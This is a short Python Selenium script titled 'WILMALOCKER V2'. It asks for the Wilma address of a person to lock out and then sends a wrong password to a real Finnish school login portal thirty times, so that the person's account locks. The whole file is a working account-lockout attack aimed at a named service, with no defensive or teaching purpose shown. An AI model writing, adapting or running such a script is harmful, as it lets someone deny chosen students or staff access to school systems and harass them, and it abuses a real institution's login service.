from selenium import webdriver
import time

print("""__      _____ _    __  __   _   _    ___   ___ _  _____ ___  __   _____ 
\ \    / /_ _| |  |  \/  | /_\ | |  / _ \ / __| |/ / __| _ \ \ \ / /_  )
 \ \/\/ / | || |__| |\/| |/ _ \| |_| (_) | (__| ' <| _||   /  \ V / / / 
  \_/\_/ |___|____|_|  |_/_/ \_\____\___/ \___|_|\_\___|_|_\   \_/ /___|
                                                                       """)

time.sleep(0.5)

email = input("Lukittavan henkilön wilma address: ")
passw = "asdjhasd2"

web = webdriver.Chrome()
web.get('https://yvkoulut.inschool.fi')

time.sleep(0.5)

for i in range(30):
    mailfield = web.find_element_by_xpath('//*[@id="login-frontdoor"]')
    mailfield.send_keys(email)
    passfield = web.find_element_by_xpath('//*[@id="password"]')
    passfield.send_keys(passw)
    submit = web.find_element_by_xpath('/html/body/div[2]/div[1]/div[1]/div/div/form/div[3]/div/input')
    submit.click()
web.quit()
quit()
